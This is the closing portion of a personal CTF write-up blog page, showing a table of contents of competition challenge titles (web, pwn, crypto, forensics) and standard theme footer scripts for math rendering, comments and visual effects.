class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#web-2"><span class="toc-number">9.1.</span> <span class="toc-text">web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Some-type-of-juggling"><span class="toc-number">9.1.1.</span> <span class="toc-text">Some type of juggling</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exclusive-access"><span class="toc-number">9.1.2.</span> <span class="toc-text">Exclusive access</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#It-is-Magic-after-all"><span class="toc-number">9.1.3.</span> <span class="toc-text">It is Magic after all</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pwn"><span class="toc-number">9.2.</span> <span class="toc-text">Pwn</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reverse-Engineering"><span class="toc-number">9.3.</span> <span class="toc-text">Reverse Engineering</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Crypto"><span class="toc-number">9.4.</span> <span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#A-simple-challenge"><span class="toc-number">9.4.1.</span> <span class="toc-text">A simple challenge</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Roman-encryption"><span class="toc-number">9.4.2.</span> <span class="toc-text">Roman encryption</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Hextraordinary-security"><span class="toc-number">9.4.3.</span> <span class="toc-text">Hextraordinary security</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Mission"><span class="toc-number">9.5.</span> <span class="toc-text">Mission</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Something-Suspicious"><span class="toc-number">9.5.1.</span> <span class="toc-text">Something Suspicious</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Decrypting-the-payload"><span class="toc-number">9.5.2.</span> <span class="toc-text">Decrypting the payload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Locked-outside"><span class="toc-number">9.5.3.</span> <span class="toc-text">Locked outside</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Changing-our-locks-and-dumping-old-keys"><span class="toc-number">9.5.4.</span> <span class="toc-text">Changing our locks and dumping old keys</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Know-your-enemy"><span class="toc-number">9.5.5.</span> <span class="toc-text">Know your enemy</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Blue-team-becomes-Red-Team"><span class="toc-number">9.5.6.</span> <span class="toc-text">Blue team becomes Red Team</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Forensics"><span class="toc-number">9.6.</span> <span class="toc-text">Forensics</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Hiding-in-plain-sight"><span class="toc-number">9.6.1.</span> <span class="toc-text">Hiding in plain sight</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Welcome-to-the-challenge"><span class="toc-number">9.6.2.</span> <span class="toc-text">Welcome to the challenge</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#About-us"><span class="toc-number">9.6.3.</span> <span class="toc-text">About us</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Keyp-it-universal"><span class="toc-number">9.6.4.</span> <span class="toc-text">Keyp it universal</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Maybe-the-helper-can-help"><span class="toc-number">9.6.5.</span> <span class="toc-text">Maybe the helper can help</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#OSINT"><span class="toc-number">9.7.</span> <span class="toc-text">OSINT</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Welcome-to-Lisbon"><span class="toc-number">9.7.1.</span> <span class="toc-text">Welcome to Lisbon!</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Network"><span class="toc-number">9.8.</span> <span class="toc-text">Network</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Knock-Knock"><span class="toc-number">9.8.1.</span> <span class="toc-text">Knock Knock</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reverse"><span class="toc-number">9.9.</span> <span class="toc-text">Reverse</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#find-plut0"><span class="toc-number">9.9.1.</span> <span class="toc-text">find_plut0</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%90%83%E7%93%9C%E6%9D%AF"><span class="toc-number">10.</span> <span class="toc-text">吃瓜杯</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80-5"><span class="toc-number">10.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc"><span class="toc-number">10.2.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Misc%E6%B8%B8%E6%88%8F%E7%AD%BE%E5%88%B0"><span class="toc-number">10.2.1.</span> <span class="toc-text">Misc游戏签到</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%83%E7%93%9C"><span class="toc-number">10.2.2.</span> <span class="toc-text">吃瓜</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#RaCTF"><span class="toc-number">11.</span> <span class="toc-text">RaCTF</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Miscellaneous"><span class="toc-number">11.1.</span> <span class="toc-text">Miscellaneous</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Discord"><span class="toc-number">11.1.1.</span> <span class="toc-text">Discord</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Steganography"><span class="toc-number">11.2.</span> <span class="toc-text">Steganography</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#I%E2%80%99m-a-Shouty-Man"><span class="toc-number">11.2.1.</span> <span class="toc-text">I’m a Shouty Man</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Hacker%E2%80%99s-Playground-2021"><span class="toc-number">12.</span> <span class="toc-text">Hacker’s Playground 2021</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc-1"><span class="toc-number">12.1.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AD%BE%E5%88%B0-2"><span class="toc-number">12.1.1.</span> <span class="toc-text">签到</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Survey"><span class="toc-number">12.1.2.</span> <span class="toc-text">Survey</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pwn-1"><span class="toc-number">12.2.</span> <span class="toc-text">Pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#BOF-101"><span class="toc-number">12.2.1.</span> <span class="toc-text">BOF 101</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BOF-102"><span class="toc-number">12.2.2.</span> <span class="toc-text">BOF 102</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-number">12.3.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SQLi-101"><span class="toc-number">12.3.1.</span> <span class="toc-text">SQLi 101</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQLi-102"><span class="toc-number">12.3.2.</span> <span class="toc-text">SQLi 102</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Crypto-1"><span class="toc-number">12.4.</span> <span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#RC-four"><span class="toc-number">12.4.1.</span> <span class="toc-text">RC four</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RSA-101"><span class="toc-number">12.4.2.</span> <span class="toc-text">RSA 101</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#corCTF"><span class="toc-number">13.</span> <span class="toc-text">corCTF</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#FwordCTF"><span class="toc-number">14.</span> <span class="toc-text">FwordCTF</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Cryptography"><span class="toc-number">14.1.</span> <span class="toc-text">Cryptography</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Leaky-Blinders"><span class="toc-number">14.1.1.</span> <span class="toc-text">Leaky Blinders</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#W-amp-M-CTF"><span class="toc-number">15.</span> <span class="toc-text">W&amp;M CTF</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc-2"><span class="toc-number">15.1.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%A0%E7%94%BB%E6%88%91%E7%8C%9C"><span class="toc-number">15.1.1.</span> <span class="toc-text">你画我猜</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#WORMCON-CTF"><span class="toc-number">16.</span> <span class="toc-text">WORMCON CTF</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80-6"><span class="toc-number">16.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Cryptography-1"><span class="toc-number">16.2.</span> <span class="toc-text">Cryptography</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#RoboXOR"><span class="toc-number">16.2.1.</span> <span class="toc-text">RoboXOR</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exclusive"><span class="toc-number">16.2.2.</span> <span class="toc-text">Exclusive</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#DASCTF%E5%85%AB%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B"><span class="toc-number">17.</span> <span class="toc-text">DASCTF八月挑战赛</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc-3"><span class="toc-number">17.1.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AD%BE%E5%88%B0-3"><span class="toc-number">17.1.1.</span> <span class="toc-text">签到</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%92%E7%8E%8B%E2%80%99sblog"><span class="toc-number">17.1.2.</span> <span class="toc-text">寒王’sblog</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Crypto-2"><span class="toc-number">17.2.</span> <span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#easymath"><span class="toc-number">17.2.1.</span> <span class="toc-text">easymath</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ALLES-CTF-2021"><span class="toc-number">18.</span> <span class="toc-text">ALLES! CTF 2021</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc-4"><span class="toc-number">18.1.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Pyimplant"><span class="toc-number">18.1.1.</span> <span class="toc-text">Pyimplant</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web-1"><span class="toc-number">18.2.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Sanity-Check"><span class="toc-number">18.2.1.</span> <span class="toc-text">Sanity Check</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#GrabCON-CTF"><span class="toc-number">19.</span> <span class="toc-text">GrabCON CTF</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Crypto-3"><span class="toc-number">19.1.</span> <span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Warm-up"><span class="toc-number">19.1.1.</span> <span class="toc-text">Warm-up</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PokA%C2%A9-Ball-RSA"><span class="toc-number">19.1.2.</span> <span class="toc-text">PokÃ© Ball RSA</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Old-Monk%E2%80%99s-Password"><span class="toc-number">19.1.3.</span> <span class="toc-text">Old Monk’s Password</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc-5"><span class="toc-number">19.2.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Welcome"><span class="toc-number">19.2.1.</span> <span class="toc-text">Welcome</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Discord-1"><span class="toc-number">19.2.2.</span> <span class="toc-text">Discord</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#OSINT-1"><span class="toc-number">19.3.</span> <span class="toc-text">OSINT</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Victim-1"><span class="toc-number">19.3.1.</span> <span class="toc-text">Victim 1</span></a></li></ol></li></ol></li></ol></div></div></div></div></main><footer id="footer" style="background-image: url('/img/topimg/image-20210530011121777.png')"><div id="footer-wrap"><div class="copyright">&copy;2021 - 2022 By M4XLMUM</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="font-plus" type="button" title="放大字体"><i class="fas fa-plus"></i></button><button id="font-minus" type="button" title="缩小字体"><i class="fas fa-minus"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div></div><hr/><div id="local-search-results"></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>if (!window.MathJax) {
  window.MathJax = {
    loader: {
      source: {
        '[tex]/amsCd': '[tex]/amscd'
      }
    },
    tex: {
      inlineMath: [ ['$','$'], ["\\(","\\)"]],
      tags: 'ams'
    },
    options: {
      renderActions: {
        findScript: [10, doc => {
          for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
            const display = !!node.type.match(/; *mode=display/)
            const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display)
            const text = document.createTextNode('')
            node.parentNode.replaceChild(text, node)
            math.start = {node: text, delim: '', n: 0}
            math.end = {node: text, delim: '', n: 0}
            doc.math.push(math)
          }
        }, ''],
        addClass: [200,() => {
          document.querySelectorAll('mjx-container:not([display=\'true\']').forEach( node => {
            const target = node.parentNode
            if (!target.classList.contains('has-jax')) {
              target.classList.add('mathjax-overflow')
            }
          })
        }, '', false]
      }
    }
  }
  
  const script = document.createElement('script')
  script.src = 'https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js'
  script.id = 'MathJax-script'
  script.async = true
  document.head.appendChild(script)
} else {
  MathJax.startup.document.state(0)
  MathJax.texReset()
  MathJax.typeset()
}</script><script>function loadValine () {
  function initValine () {
    const valine = new Valine(Object.assign({
      el: '#vcomment',
      appId: 'hQSVii4djRLOjBYaCK5zOXhB-gzGzoHsz',
      appKey: 'eaCREaPBTzvLpmQcrAhlnzGe',
      placeholder: '记得留下你的昵称和邮箱....可以快速收到回复',
      avatar: 'monsterid',
      meta: 'nick,mail,link'.split(','),
      pageSize: '10',
      lang: 'zh-CN',
      recordIP: true,
      serverURLs: '',
      emojiCDN: '',
      emojiMaps: "",
      enableQQ: true,
      path: window.location.pathname,
      requiredFields: ["nick"],
      visitor: true
    }, null))
  }

  if (typeof Valine === 'function') initValine() 
  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
}

if ('Valine' === 'Valine' || !false) {
  if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
  else setTimeout(loadValine, 0)
} else {
  function loadOtherComment () {
    loadValine()
  }
}</script></div><canvas class="fireworks" mobile="true"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/fireworks.min.js"></script><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="false" data-click="true"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
POWERMODE.shake = true;
POWERMODE.mobile = false;
document.body.addEventListener('input', POWERMODE);
</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>